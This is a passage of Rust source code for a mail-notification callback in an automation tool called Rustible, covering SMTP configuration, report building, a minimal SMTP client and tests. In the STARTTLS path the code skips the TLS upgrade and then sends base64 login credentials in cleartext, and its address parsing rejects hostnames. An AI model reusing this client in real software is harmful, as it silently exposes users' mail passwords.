\"true\" | \"1\" =\u003e Self::StartTls,\n            _ =\u003e Self::StartTls,\n        }\n    }\n}\n\nimpl std::fmt::Display for TlsMode {\n    fn fmt(\u0026self, f: \u0026mut std::fmt::Formatter\u003c'_\u003e) -\u003e std::fmt::Result {\n        match self {\n            Self::None =\u003e write!(f, \"none\"),\n            Self::Implicit =\u003e write!(f, \"implicit\"),\n            Self::StartTls =\u003e write!(f, \"starttls\"),\n        }\n    }\n}\n\n/// Configuration for the mail callback.\n#[derive(Debug, Clone)]\npub struct MailConfig {\n    /// SMTP server hostname.\n    pub smtp_host: String,\n    /// SMTP server port (default: 587).\n    pub smtp_port: u16,\n    /// SMTP authentication username (optional).\n    pub smtp_user: Option\u003cString\u003e,\n    /// SMTP authentication password (optional).\n    pub smtp_password: Option\u003cString\u003e,\n    /// Sender email address (From header).\n    pub from_address: String,\n    /// List of recipient email addresses (To header).\n    pub recipients: Vec\u003cString\u003e,\n    /// TLS mode for the connection.\n    pub tls_mode: TlsMode,\n    /// Only send email on playbook failure.\n    pub on_failure_only: bool,\n    /// Subject line prefix (default: \"[Rustible]\").\n    pub subject_prefix: String,\n    /// Connection timeout in seconds (default: 30).\n    pub timeout_secs: u64,\n}\n\nimpl Default for MailConfig {\n    fn default() -\u003e Self {\n        Self {\n            smtp_host: String::new(),\n            smtp_port: 587,\n            smtp_user: None,\n            smtp_password: None,\n            from_address: String::new(),\n            recipients: Vec::new(),\n            tls_mode: TlsMode::StartTls,\n            on_failure_only: false,\n            subject_prefix: \"[Rustible]\".to_string(),\n            timeout_secs: 30,\n        }\n    }\n}\n\nimpl MailConfig {\n    /// Creates a new mail configuration builder.\n    pub fn builder() -\u003e MailConfigBuilder {\n        MailConfigBuilder::new()\n    }\n\n    /// Creates a new mail configuration from environment variables.\n    ///\n    /// # Environment Variables\n    ///\n    /// - `RUSTIBLE_SMTP_HOST` - SMTP server hostname (required)\n    /// - `RUSTIBLE_SMTP_PORT` - SMTP server port (default: 587)\n    /// - `RUSTIBLE_SMTP_USER` - SMTP authentication username\n    /// - `RUSTIBLE_SMTP_PASSWORD` - SMTP authentication password\n    /// - `RUSTIBLE_SMTP_FROM` - Sender email address (required)\n    /// - `RUSTIBLE_SMTP_TLS` - TLS mode (default: \"starttls\")\n    /// - `RUSTIBLE_MAIL_RECIPIENTS` - Comma-separated recipient list (required)\n    /// - `RUSTIBLE_MAIL_ON_FAILURE_ONLY` - Only send on failure\n    /// - `RUSTIBLE_MAIL_SUBJECT_PREFIX` - Subject line prefix\n    ///\n    /// # Errors\n    ///\n    /// Returns an error if required environment variables are missing.\n    pub fn from_env() -\u003e Result\u003cSelf\u003e {\n        let smtp_host = env::var(\"RUSTIBLE_SMTP_HOST\").map_err(|_| {\n            Error::Config(\"RUSTIBLE_SMTP_HOST environment variable not set\".to_string())\n        })?;\n\n        let from_address = env::var(\"RUSTIBLE_SMTP_FROM\").map_err(|_| {\n            Error::Config(\"RUSTIBLE_SMTP_FROM environment variable not set\".to_string())\n        })?;\n\n        let recipients_str = env::var(\"RUSTIBLE_MAIL_RECIPIENTS\").unwrap_or_default();\n        let recipients: Vec\u003cString\u003e = recipients_str\n            .split(',')\n            .map(|s| s.trim().to_string())\n            .filter(|s| !s.is_empty())\n            .collect();\n\n        if recipients.is_empty() {\n            return Err(Error::Config(\n                \"RUSTIBLE_MAIL_RECIPIENTS must contain at least one recipient\".to_string(),\n            ));\n        }\n\n        let smtp_port = env::var(\"RUSTIBLE_SMTP_PORT\")\n            .ok()\n            .and_then(|p| p.parse().ok())\n            .unwrap_or(587);\n\n        let tls_mode = env::var(\"RUSTIBLE_SMTP_TLS\")\n            .map(|s| TlsMode::from_str(\u0026s))\n            .unwrap_or(TlsMode::StartTls);\n\n        let on_failure_only = env::var(\"RUSTIBLE_MAIL_ON_FAILURE_ONLY\")\n            .map(|s| s.to_lowercase() == \"true\" || s == \"1\")\n            .unwrap_or(false);\n\n        let subject_prefix =\n            env::var(\"RUSTIBLE_MAIL_SUBJECT_PREFIX\").unwrap_or_else(|_| \"[Rustible]\".to_string());\n\n        let timeout_secs = env::var(\"RUSTIBLE_SMTP_TIMEOUT\")\n            .ok()\n            .and_then(|t| t.parse().ok())\n            .unwrap_or(30);\n\n        Ok(Self {\n            smtp_host,\n            smtp_port,\n            smtp_user: env::var(\"RUSTIBLE_SMTP_USER\").ok(),\n            smtp_password: env::var(\"RUSTIBLE_SMTP_PASSWORD\").ok(),\n            from_address,\n            recipients,\n            tls_mode,\n            on_failure_only,\n            subject_prefix,\n            timeout_secs,\n        })\n    }\n\n    /// Validates the configuration.\n    ///\n    /// # Errors\n    ///\n    /// Returns an error if the configuration is invalid.\n    pub fn validate(\u0026self) -\u003e Result\u003c()\u003e {\n        if self.smtp_host.is_empty() {\n            return Err(Error::Config(\"SMTP host is required\".to_string()));\n        }\n        if self.from_address.is_empty() {\n            return Err(Error::Config(\"From address is required\".to_string()));\n        }\n        if self.recipients.is_empty() {\n            return Err(Error::Config(\n                \"At least one recipient is required\".to_string(),\n            ));\n        }\n        // Basic email format validation\n        if !self.from_address.contains('@') {\n            return Err(Error::Config(format!(\n                \"Invalid from address format: {}\",\n                self.from_address\n            )));\n        }\n        for recipient in \u0026self.recipients {\n            if !recipient.contains('@') {\n                return Err(Error::Config(format!(\n                    \"Invalid recipient address format: {}\",\n                    recipient\n                )));\n            }\n        }\n        Ok(())\n    }\n}\n\n/// Builder for [`MailConfig`].\n#[derive(Debug, Clone, Default)]\npub struct MailConfigBuilder {\n    config: MailConfig,\n}\n\nimpl MailConfigBuilder {\n    /// Creates a new builder with default configuration.\n    pub fn new() -\u003e Self {\n        Self::default()\n    }\n\n    /// Sets the SMTP host.\n    pub fn smtp_host(mut self, host: impl Into\u003cString\u003e) -\u003e Self {\n        self.config.smtp_host = host.into();\n        self\n    }\n\n    /// Sets the SMTP port (default: 587).\n    pub fn smtp_port(mut self, port: u16) -\u003e Self {\n        self.config.smtp_port = port;\n        self\n    }\n\n    /// Sets the SMTP authentication username.\n    pub fn smtp_user(mut self, user: impl Into\u003cString\u003e) -\u003e Self {\n        self.config.smtp_user = Some(user.into());\n        self\n    }\n\n    /// Sets the SMTP authentication password.\n    pub fn smtp_password(mut self, password: impl Into\u003cString\u003e) -\u003e Self {\n        self.config.smtp_password = Some(password.into());\n        self\n    }\n\n    /// Sets the sender email address.\n    pub fn from_address(mut self, from: impl Into\u003cString\u003e) -\u003e Self {\n        self.config.from_address = from.into();\n        self\n    }\n\n    /// Adds a recipient email address.\n    pub fn add_recipient(mut self, recipient: impl Into\u003cString\u003e) -\u003e Self {\n        self.config.recipients.push(recipient.into());\n        self\n    }\n\n    /// Sets all recipient email addresses.\n    pub fn recipients(mut self, recipients: Vec\u003cString\u003e) -\u003e Self {\n        self.config.recipients = recipients;\n        self\n    }\n\n    /// Sets the TLS mode.\n    pub fn tls_mode(mut self, mode: TlsMode) -\u003e Self {\n        self.config.tls_mode = mode;\n        self\n    }\n\n    /// Sets whether to only send on failure.\n    pub fn on_failure_only(mut self, only_failure: bool) -\u003e Self {\n        self.config.on_failure_only = only_failure;\n        self\n    }\n\n    /// Sets the subject line prefix.\n    pub fn subject_prefix(mut self, prefix: impl Into\u003cString\u003e) -\u003e Self {\n        self.config.subject_prefix = prefix.into();\n        self\n    }\n\n    /// Sets the connection timeout in seconds.\n    pub fn timeout_secs(mut self, timeout: u64) -\u003e Self {\n        self.config.timeout_secs = timeout;\n        self\n    }\n\n    /// Builds the configuration.\n    ///\n    /// # Errors\n    ///\n    /// Returns an error if the configuration is invalid.\n    pub fn build(self) -\u003e Result\u003cMailConfig\u003e {\n        self.config.validate()?;\n        Ok(self.config)\n    }\n\n    /// Builds the configuration without validation.\n    ///\n    /// Use with caution - the resulting config may fail at runtime.\n    pub fn build_unchecked(self) -\u003e MailConfig {\n        self.config\n    }\n}\n\n/// Statistics tracked per host during execution.\n#[derive(Debug, Clone, Default)]\nstruct HostStats {\n    /// Count of successful tasks (no changes).\n    ok: u32,\n    /// Count of tasks that made changes.\n    changed: u32,\n    /// Count of failed tasks.\n    failed: u32,\n    /// Count of skipped tasks.\n    skipped: u32,\n    /// Count of unreachable attempts.\n    unreachable: u32,\n}\n\nimpl HostStats {\n    /// Returns total tasks executed.\n    fn total(\u0026self) -\u003e u32 {\n        self.ok + self.changed + self.failed + self.skipped\n    }\n\n    /// Returns true if any failures occurred.\n    #[allow(dead_code)]\n    fn has_issues(\u0026self) -\u003e bool {\n        self.failed \u003e 0 || self.unreachable \u003e 0\n    }\n}\n\n/// Details of a failed task for the report.\n#[derive(Debug, Clone)]\nstruct FailedTask {\n    host: String,\n    task_name: String,\n    message: String,\n}\n\n/// Internal state for tracking playbook execution.\n#[derive(Debug, Default)]\nstruct ExecutionState {\n    /// Playbook name.\n    playbook_name: Option\u003cString\u003e,\n    /// Start time of playbook execution.\n    start_time: Option\u003cInstant\u003e,\n    /// Per-host statistics.\n    host_stats: HashMap\u003cString, HostStats\u003e,\n    /// Whether any failures occurred.\n    has_failures: bool,\n    /// List of failed task details for the report.\n    failed_tasks: Vec\u003cFailedTask\u003e,\n}\n\nimpl ExecutionState {\n    /// Resets the state for a new playbook run.\n    fn reset(\u0026mut self) {\n        self.playbook_name = None;\n        self.start_time = None;\n        self.host_stats.clear();\n        self.has_failures = false;\n        self.failed_tasks.clear();\n    }\n}\n\n/// Mail callback plugin that sends email notifications on playbook completion.\n///\n/// This callback tracks execution statistics and sends a summary email\n/// when a playbook completes. It can be configured to send emails only\n/// on failure, making it suitable for CI/CD notification workflows.\n///\n/// # Thread Safety\n///\n/// This callback is thread-safe and can be used in concurrent execution\n/// scenarios. All internal state is protected by `RwLock`.\n///\n/// # Example\n///\n/// ```rust,ignore\n/// use rustible::callback::plugins::{MailCallback, MailConfig};\n///\n/// // Create from environment variables\n/// let callback = MailCallback::from_env()?;\n///\n/// // Or with explicit configuration\n/// let config = MailConfig::builder()\n///     .smtp_host(\"smtp.example.com\")\n///     .smtp_port(587)\n///     .from_address(\"rustible@example.com\")\n///     .add_recipient(\"admin@example.com\")\n///     .on_failure_only(true)\n///     .build()?;\n/// let callback = MailCallback::new(config);\n/// ```\n#[derive(Debug)]\npub struct MailCallback {\n    /// Mail configuration.\n    config: MailConfig,\n    /// Execution state.\n    state: Arc\u003cRwLock\u003cExecutionState\u003e\u003e,\n}\n\nimpl MailCallback {\n    /// Creates a new mail callback with the given configuration.\n    ///\n    /// # Arguments\n    ///\n    /// * `config` - Mail configuration\n    ///\n    /// # Example\n    ///\n    /// ```rust,ignore\n    /// let config = MailConfig::builder()\n    ///     .smtp_host(\"smtp.example.com\")\n    ///     .smtp_port(587)\n    ///     .from_address(\"rustible@example.com\")\n    ///     .add_recipient(\"admin@example.com\")\n    ///     .build()?;\n    /// let callback = MailCallback::new(config);\n    /// ```\n    #[must_use]\n    pub fn new(config: MailConfig) -\u003e Self {\n        Self {\n            config,\n            state: Arc::new(RwLock::new(ExecutionState::default())),\n        }\n    }\n\n    /// Creates a new mail callback from environment variables.\n    ///\n    /// # Errors\n    ///\n    /// Returns an error if required environment variables are missing.\n    ///\n    /// # Example\n    ///\n    /// ```rust,ignore\n    /// // Set environment variables first:\n    /// // RUSTIBLE_SMTP_HOST=smtp.example.com\n    /// // RUSTIBLE_SMTP_FROM=rustible@example.com\n    /// // RUSTIBLE_MAIL_RECIPIENTS=admin@example.com\n    ///\n    /// let callback = MailCallback::from_env()?;\n    /// ```\n    pub fn from_env() -\u003e Result\u003cSelf\u003e {\n        let config = MailConfig::from_env()?;\n        config.validate()?;\n        Ok(Self::new(config))\n    }\n\n    /// Returns the current configuration.\n    #[must_use]\n    pub fn config(\u0026self) -\u003e \u0026MailConfig {\n        \u0026self.config\n    }\n\n    /// Returns whether the callback is configured to only send on failure.\n    #[must_use]\n    pub fn on_failure_only(\u0026self) -\u003e bool {\n        self.config.on_failure_only\n    }\n\n    /// Generates the email subject line.\n    fn generate_subject(\u0026self, playbook_name: \u0026str, success: bool) -\u003e String {\n        let status = if success {\n            \"completed successfully\"\n        } else {\n            \"FAILED\"\n        };\n        format!(\n            \"{} Playbook '{}' {}\",\n            self.config.subject_prefix, playbook_name, status\n        )\n    }\n\n    /// Generates the email body with execution summary.\n    fn generate_body(\u0026self, state: \u0026ExecutionState, success: bool) -\u003e String {\n        let mut body = String::with_capacity(2048);\n\n        let playbook_name = state.playbook_name.as_deref().unwrap_or(\"unknown\");\n\n        // Header\n        writeln!(body, \"Playbook Execution Summary\").unwrap();\n        writeln!(body, \"==========================\").unwrap();\n        writeln!(body).unwrap();\n\n        // Basic info\n        writeln!(body, \"Playbook: {}\", playbook_name).unwrap();\n        writeln!(\n            body,\n            \"Status: {}\",\n            if success { \"SUCCESS\" } else { \"FAILED\" }\n        )\n        .unwrap();\n\n        // Duration\n        if let Some(start) = state.start_time {\n            let duration = start.elapsed();\n            writeln!(body, \"Duration: {}\", format_duration(duration)).unwrap();\n        }\n\n        writeln!(body).unwrap();\n\n        // Failed tasks section (if any)\n        if !state.failed_tasks.is_empty() {\n            writeln!(body, \"Failed Tasks\").unwrap();\n            writeln!(body, \"------------\").unwrap();\n            writeln!(body).unwrap();\n\n            for task in \u0026state.failed_tasks {\n                writeln!(body, \"  Host: {}\", task.host).unwrap();\n                writeln!(body, \"  Task: {}\", task.task_name).unwrap();\n                writeln!(body, \"  Error: {}\", task.message).unwrap();\n                writeln!(body).unwrap();\n            }\n        }\n\n        // Host summary\n        writeln!(body, \"Host Summary\").unwrap();\n        writeln!(body, \"------------\").unwrap();\n        writeln!(body).unwrap();\n\n        let mut hosts: Vec\u003c_\u003e = state.host_stats.keys().collect();\n        hosts.sort();\n\n        let mut total_ok = 0u32;\n        let mut total_changed = 0u32;\n        let mut total_failed = 0u32;\n        let mut total_skipped = 0u32;\n        let mut total_unreachable = 0u32;\n\n        for host in \u0026hosts {\n            if let Some(stats) = state.host_stats.get(*host) {\n                writeln!(body, \"{}:\", host).unwrap();\n                writeln!(\n                    body,\n                    \"  OK: {}  Changed: {}  Failed: {}  Skipped: {}  Unreachable: {}\",\n                    stats.ok, stats.changed, stats.failed, stats.skipped, stats.unreachable\n                )\n                .unwrap();\n                writeln!(body).unwrap();\n\n                total_ok += stats.ok;\n                total_changed += stats.changed;\n                total_failed += stats.failed;\n                total_skipped += stats.skipped;\n                total_unreachable += stats.unreachable;\n            }\n        }\n\n        // Totals\n        writeln!(body, \"Totals\").unwrap();\n        writeln!(body, \"------\").unwrap();\n        writeln!(body, \"Total OK: {}\", total_ok).unwrap();\n        writeln!(body, \"Total Changed: {}\", total_changed).unwrap();\n        writeln!(body, \"Total Failed: {}\", total_failed).unwrap();\n        writeln!(body, \"Total Skipped: {}\", total_skipped).unwrap();\n        writeln!(body, \"Total Unreachable: {}\", total_unreachable).unwrap();\n        writeln!(body).unwrap();\n\n        // Footer\n        writeln!(body, \"---\").unwrap();\n        writeln!(body, \"Generated by Rustible\").unwrap();\n\n        body\n    }\n\n    /// Sends the notification email.\n    async fn send_email(\u0026self, subject: \u0026str, body: \u0026str) -\u003e Result\u003c()\u003e {\n        let config = self.config.clone();\n        let subject = subject.to_string();\n        let body = body.to_string();\n\n        tokio::task::spawn_blocking(move || send_smtp_email(\u0026config, \u0026subject, \u0026body))\n            .await\n            .map_err(|e| Error::Other {\n                message: format!(\"Failed to spawn email task: {}\", e),\n                source: None,\n            })?\n    }\n}\n\nimpl Clone for MailCallback {\n    fn clone(\u0026self) -\u003e Self {\n        Self {\n            config: self.config.clone(),\n            state: Arc::clone(\u0026self.state),\n        }\n    }\n}\n\n#[async_trait]\nimpl ExecutionCallback for MailCallback {\n    async fn on_playbook_start(\u0026self, name: \u0026str) {\n        let mut state = self.state.write().await;\n        state.reset();\n        state.playbook_name = Some(name.to_string());\n        state.start_time = Some(Instant::now());\n    }\n\n    async fn on_playbook_end(\u0026self, name: \u0026str, success: bool) {\n        let state = self.state.read().await;\n\n        // Check if we should send email\n        if self.config.on_failure_only \u0026\u0026 success {\n            tracing::debug!(\n                \"Skipping mail notification for successful playbook (on_failure_only=true)\"\n            );\n            return;\n        }\n\n        // Generate email content\n        let subject = self.generate_subject(name, success);\n        let body = self.generate_body(\u0026state, success);\n\n        // Drop the lock before sending email\n        drop(state);\n\n        // Send the email\n        if let Err(e) = self.send_email(\u0026subject, \u0026body).await {\n            tracing::error!(\"Failed to send mail notification: {}\", e);\n        } else {\n            tracing::info!(\n                \"Mail notification sent to {} recipient(s)\",\n                self.config.recipients.len()\n            );\n        }\n    }\n\n    async fn on_play_start(\u0026self, _name: \u0026str, hosts: \u0026[String]) {\n        let mut state = self.state.write().await;\n        for host in hosts {\n            state.host_stats.entry(host.clone()).or_default();\n        }\n    }\n\n    async fn on_play_end(\u0026self, _name: \u0026str, _success: bool) {\n        // Nothing to do - we send email at playbook end\n    }\n\n    async fn on_task_start(\u0026self, _name: \u0026str, _host: \u0026str) {\n        // Nothing to track at task start for mail purposes\n    }\n\n    async fn on_task_complete(\u0026self, result: \u0026ExecutionResult) {\n        let mut state = self.state.write().await;\n        let host_stats = state.host_stats.entry(result.host.clone()).or_default();\n\n        if result.result.skipped {\n            host_stats.skipped += 1;\n        } else if !result.result.success {\n            host_stats.failed += 1;\n            state.has_failures = true;\n\n            // Record failed task details\n            state.failed_tasks.push(FailedTask {\n                host: result.host.clone(),\n                task_name: result.task_name.clone(),\n                message: result.result.message.clone(),\n            });\n        } else if result.result.changed {\n            host_stats.changed += 1;\n        } else {\n            host_stats.ok += 1;\n        }\n    }\n\n    async fn on_handler_triggered(\u0026self, _name: \u0026str) {\n        // Nothing to track for mail purposes\n    }\n\n    async fn on_facts_gathered(\u0026self, _host: \u0026str, _facts: \u0026Facts) {\n        // Nothing to track for mail purposes\n    }\n}\n\n/// Trait extension for handling unreachable hosts in mail notifications.\n#[async_trait]\npub trait MailUnreachableCallback: ExecutionCallback {\n    /// Called when a host becomes unreachable.\n    async fn on_host_unreachable(\u0026self, host: \u0026str, task_name: \u0026str, error: \u0026str);\n}\n\n#[async_trait]\nimpl MailUnreachableCallback for MailCallback {\n    async fn on_host_unreachable(\u0026self, host: \u0026str, task_name: \u0026str, error: \u0026str) {\n        let mut state = self.state.write().await;\n        let host_stats = state.host_stats.entry(host.to_string()).or_default();\n        host_stats.unreachable += 1;\n        state.has_failures = true;\n\n        // Record as a failed task\n        state.failed_tasks.push(FailedTask {\n            host: host.to_string(),\n            task_name: task_name.to_string(),\n            message: format!(\"Host unreachable: {}\", error),\n        });\n    }\n}\n\n/// Format a duration in a human-readable way.\nfn format_duration(duration: std::time::Duration) -\u003e String {\n    let total_secs = duration.as_secs_f64();\n\n    if total_secs \u003c 1.0 {\n        format!(\"{:.0}ms\", duration.as_millis())\n    } else if total_secs \u003c 60.0 {\n        format!(\"{:.1}s\", total_secs)\n    } else if total_secs \u003c 3600.0 {\n        let mins = (total_secs / 60.0).floor();\n        let secs = total_secs % 60.0;\n        format!(\"{:.0}m {:.1}s\", mins, secs)\n    } else {\n        let hours = (total_secs / 3600.0).floor();\n        let mins = ((total_secs % 3600.0) / 60.0).floor();\n        let secs = total_secs % 60.0;\n        format!(\"{:.0}h {:.0}m {:.1}s\", hours, mins, secs)\n    }\n}\n\n/// Sends an email via SMTP.\n///\n/// This is a minimal SMTP implementation that supports:\n/// - Plain SMTP (no TLS)\n/// - STARTTLS upgrade (note: actual TLS requires external library)\n/// - AUTH LOGIN authentication\n///\n/// For production use with full TLS support, consider using the `lettre` crate.\nfn send_smtp_email(config: \u0026MailConfig, subject: \u0026str, body: \u0026str) -\u003e Result\u003c()\u003e {\n    use std::time::Duration;\n\n    // Connect to SMTP server\n    let addr = format!(\"{}:{}\", config.smtp_host, config.smtp_port);\n    let stream = TcpStream::connect_timeout(\n        \u0026addr.parse().map_err(|e| Error::Other {\n            message: format!(\"Invalid SMTP address '{}': {}\", addr, e),\n            source: None,\n        })?,\n        Duration::from_secs(config.timeout_secs),\n    )\n    .map_err(|e| Error::Other {\n        message: format!(\"Failed to connect to SMTP server '{}': {}\", addr, e),\n        source: None,\n    })?;\n\n    stream\n        .set_read_timeout(Some(Duration::from_secs(config.timeout_secs)))\n        .ok();\n    stream\n        .set_write_timeout(Some(Duration::from_secs(config.timeout_secs)))\n        .ok();\n\n    let mut smtp = SmtpConnection::new(stream);\n\n    // Read greeting\n    smtp.read_response(220)?;\n\n    // Send EHLO\n    let hostname = hostname::get()\n        .map(|h| h.to_string_lossy().to_string())\n        .unwrap_or_else(|_| \"localhost\".to_string());\n    smtp.send_command(\u0026format!(\"EHLO {}\", hostname))?;\n    smtp.read_response(250)?;\n\n    // Handle STARTTLS if configured\n    if config.tls_mode == TlsMode::StartTls {\n        smtp.send_command(\"STARTTLS\")?;\n        let response = smtp.read_response(220);\n        if response.is_err() {\n            tracing::warn!(\"STARTTLS not supported by server, continuing without TLS\");\n        }\n        // Note: Actual TLS upgrade would require a TLS library like rustls\n        // This implementation continues without TLS upgrade\n        // For production, integrate with rustls or native-tls\n    }\n\n    // Authenticate if credentials provided\n    if let (Some(user), Some(pass)) = (\u0026config.smtp_user, \u0026config.smtp_password) {\n        smtp.send_command(\"AUTH LOGIN\")?;\n        smtp.read_response(334)?;\n\n        let user_b64 = base64::engine::general_purpose::STANDARD.encode(user);\n        smtp.send_command(\u0026user_b64)?;\n        smtp.read_response(334)?;\n\n        let pass_b64 = base64::engine::general_purpose::STANDARD.encode(pass);\n        smtp.send_command(\u0026pass_b64)?;\n        smtp.read_response(235)?;\n    }\n\n    // MAIL FROM\n    smtp.send_command(\u0026format!(\"MAIL FROM:\u003c{}\u003e\", config.from_address))?;\n    smtp.read_response(250)?;\n\n    // RCPT TO for each recipient\n    for recipient in \u0026config.recipients {\n        smtp.send_command(\u0026format!(\"RCPT TO:\u003c{}\u003e\", recipient))?;\n        smtp.read_response(250)?;\n    }\n\n    // DATA\n    smtp.send_command(\"DATA\")?;\n    smtp.read_response(354)?;\n\n    // Build and send email message\n    let message = build_email_message(config, subject, body);\n    smtp.send_data(\u0026message)?;\n    smtp.read_response(250)?;\n\n    // QUIT\n    smtp.send_command(\"QUIT\")?;\n    // Don't wait for response, just close\n\n    Ok(())\n}\n\n/// Build the email message with headers and body.\nfn build_email_message(config: \u0026MailConfig, subject: \u0026str, body: \u0026str) -\u003e String {\n    let mut message = String::with_capacity(body.len() + 512);\n\n    // Headers\n    writeln!(message, \"From: {}\", config.from_address).unwrap();\n    writeln!(message, \"To: {}\", config.recipients.join(\", \")).unwrap();\n    writeln!(message, \"Subject: {}\", subject).unwrap();\n    writeln!(message, \"MIME-Version: 1.0\").unwrap();\n    writeln!(message, \"Content-Type: text/plain; charset=utf-8\").unwrap();\n    writeln!(message, \"Content-Transfer-Encoding: 8bit\").unwrap();\n    writeln!(message, \"X-Mailer: Rustible\").unwrap();\n\n    // Date header\n    let now = chrono::Utc::now();\n    writeln!(\n        message,\n        \"Date: {}\",\n        now.format(\"%a, %d %b %Y %H:%M:%S +0000\")\n    )\n    .unwrap();\n\n    // Empty line separates headers from body\n    writeln!(message).unwrap();\n\n    // Body (escape lone dots per SMTP spec)\n    for line in body.lines() {\n        if line == \".\" {\n            writeln!(message, \"..\").unwrap();\n        } else {\n            writeln!(message, \"{}\", line).unwrap();\n        }\n    }\n\n    // End with CRLF.CRLF\n    message.push_str(\"\\r\\n.\\r\\n\");\n\n    message\n}\n\n/// Simple SMTP connection wrapper.\nstruct SmtpConnection {\n    stream: TcpStream,\n    buffer: Vec\u003cu8\u003e,\n}\n\nimpl SmtpConnection {\n    fn new(stream: TcpStream) -\u003e Self {\n        Self {\n            stream,\n            buffer: vec![0u8; 1024],\n        }\n    }\n\n    fn send_command(\u0026mut self, command: \u0026str) -\u003e Result\u003c()\u003e {\n        let cmd = format!(\"{}\\r\\n\", command);\n        self.stream\n            .write_all(cmd.as_bytes())\n            .map_err(|e| Error::Other {\n                message: format!(\"Failed to send SMTP command: {}\", e),\n                source: None,\n            })?;\n        self.stream.flush().map_err(|e| Error::Other {\n            message: format!(\"Failed to flush SMTP command: {}\", e),\n            source: None,\n        })?;\n        Ok(())\n    }\n\n    fn send_data(\u0026mut self, data: \u0026str) -\u003e Result\u003c()\u003e {\n        self.stream\n            .write_all(data.as_bytes())\n            .map_err(|e| Error::Other {\n                message: format!(\"Failed to send SMTP data: {}\", e),\n                source: None,\n            })?;\n        self.stream.flush().map_err(|e| Error::Other {\n            message: format!(\"Failed to flush SMTP data: {}\", e),\n            source: None,\n        })?;\n        Ok(())\n    }\n\n    fn read_response(\u0026mut self, expected_code: u16) -\u003e Result\u003cString\u003e {\n        let mut response = String::new();\n\n        loop {\n            let n = self\n                .stream\n                .read(\u0026mut self.buffer)\n                .map_err(|e| Error::Other {\n                    message: format!(\"Failed to read SMTP response: {}\", e),\n                    source: None,\n                })?;\n\n            if n == 0 {\n                return Err(Error::Other {\n                    message: \"SMTP connection closed unexpectedly\".to_string(),\n                    source: None,\n                });\n            }\n\n            response.push_str(\u0026String::from_utf8_lossy(\u0026self.buffer[..n]));\n\n            // Check if we have a complete response (ends with \\r\\n and has space after code)\n            if response.ends_with(\"\\r\\n\") {\n                // Check for multi-line response (code followed by -)\n                let last_line = response.lines().last().unwrap_or(\"\");\n                if last_line.len() \u003e= 4 \u0026\u0026 last_line.chars().nth(3) == Some(' ') {\n                    break;\n                }\n            }\n        }\n\n        // Parse response code\n        let code: u16 = response\n            .chars()\n            .take(3)\n            .collect::\u003cString\u003e()\n            .parse()\n            .map_err(|_| Error::Other {\n                message: format!(\"Invalid SMTP response: {}\", response),\n                source: None,\n            })?;\n\n        if code != expected_code {\n            return Err(Error::Other {\n                message: format!(\n                    \"Unexpected SMTP response: expected {}, got {}\",\n                    expected_code, response\n                ),\n                source: None,\n            });\n        }\n\n        Ok(response)\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n    use std::time::Duration;\n\n    #[test]\n    fn test_tls_mode_from_str() {\n        assert_eq!(TlsMode::from_str(\"none\"), TlsMode::None);\n        assert_eq!(TlsMode::from_str(\"false\"), TlsMode::None);\n        assert_eq!(TlsMode::from_str(\"0\"), TlsMode::None);\n        assert_eq!(TlsMode::from_str(\"implicit\"), TlsMode::Implicit);\n        assert_eq!(TlsMode::from_str(\"tls\"), TlsMode::Implicit);\n        assert_eq!(TlsMode::from_str(\"ssl\"), TlsMode::Implicit);\n        assert_eq!(TlsMode::from_str(\"starttls\"), TlsMode::StartTls);\n        assert_eq!(TlsMode::from_str(\"true\"), TlsMode::StartTls);\n        assert_eq!(TlsMode::from_str(\"1\"), TlsMode::StartTls);\n        assert_eq!(TlsMode::from_str(\"unknown\"), TlsMode::StartTls);\n    }\n\n    #[test]\n    fn test_tls_mode_display() {\n        assert_eq!(TlsMode::None.to_string(), \"none\");\n        assert_eq!(TlsMode::Implicit.to_string(), \"implicit\");\n        assert_eq!(TlsMode::StartTls.to_string(), \"starttls\");\n    }\n\n    #[test]\n    fn test_mail_config_default() {\n        let config = MailConfig::default();\n        assert!(config.smtp_host.is_empty());\n        assert_eq!(config.smtp_port, 587);\n        assert!(config.smtp_user.is_none());\n        assert!(config.smtp_password.is_none());\n        assert!(config.from_address.is_empty());\n        assert!(config.recipients.is_empty());\n        assert_eq!(config.tls_mode, TlsMode::StartTls);\n        assert!(!config.on_failure_only);\n        assert_eq!(config.subject_prefix, \"[Rustible]\");\n        assert_eq!(config.timeout_secs, 30);\n    }\n\n    #[test]\n    fn test_mail_config_builder() {\n        let config = MailConfig::builder()\n            .smtp_host(\"smtp.example.com\")\n            .smtp_port(465)\n            .smtp_user(\"user\")\n            .smtp_password(\"pass\")\n            .from_address(\"from@example.com\")\n            .add_recipient(\"to@example.com\")\n            .tls_mode(TlsMode::Implicit)\n            .on_failure_only(true)\n            .subject_prefix(\"[Test]\")\n            .timeout_secs(60)\n            .build()\n            .unwrap();\n\n        assert_eq!(config.smtp_host, \"smtp.example.com\");\n        assert_eq!(config.smtp_port, 465);\n        assert_eq!(config.smtp_user, Some(\"user\".to_string()));\n        assert_eq!(config.smtp_password, Some(\"pass\".to_string()));\n        assert_eq!(config.from_address, \"from@example.com\");\n        assert_eq!(config.recipients, vec![\"to@example.com\".to_string()]);\n        assert_eq!(config.tls_mode, TlsMode::Implicit);\n        assert!(config.on_failure_only);\n        assert_eq!(config.subject_prefix, \"[Test]\");\n        assert_eq!(config.timeout_secs, 60);\n    }\n\n    #[test]\n    fn test_mail_config_validate() {\n        let mut config = MailConfig::default();\n\n        // Empty host should fail\n        assert!(config.validate().is_err());\n\n        config.smtp_host = \"smtp.example.com\".to_string();\n        // Empty from should fail\n        assert!(config.validate().is_err());\n\n        config.from_address = \"test@example.com\".to_string();\n        // Empty recipients should fail\n        assert!(config.validate().is_err());\n\n        config.recipients = vec![\"admin@example.com\".to_string()];\n        // Now should pass\n        assert!(config.validate().is_ok());\n\n        // Invalid email format\n        config.from_address = \"invalid-email\".to_string();\n        assert!(config.validate().is_err());\n\n        config.from_address = \"test@example.com\".to_string();\n        config.recipients = vec![\"invalid-recipient\".to_string()];\n        assert!(config.validate().is_err());\n    }\n\n    #[test]\n    fn test_format_duration() {\n        assert_eq!(format_duration(Duration::from_millis(500)), \"500ms\");\n        assert_eq!(format_duration(Duration::from_secs(30)), \"30.0s\");\n        assert_eq!(format_duration(Duration::from_secs(90)), \"1m 30.0s\");\n        assert_eq!(format_duration(Duration::from_secs(3700)), \"1h 1m 40.0s\");\n    }\n\n    #[test]\n    fn test_host_stats_total() {\n        let stats = HostStats {\n            ok: 5,\n            changed: 3,\n            failed: 1,\n            skipped: 2,\n            unreachable: 0,\n        };\n        assert_eq!(stats.total(), 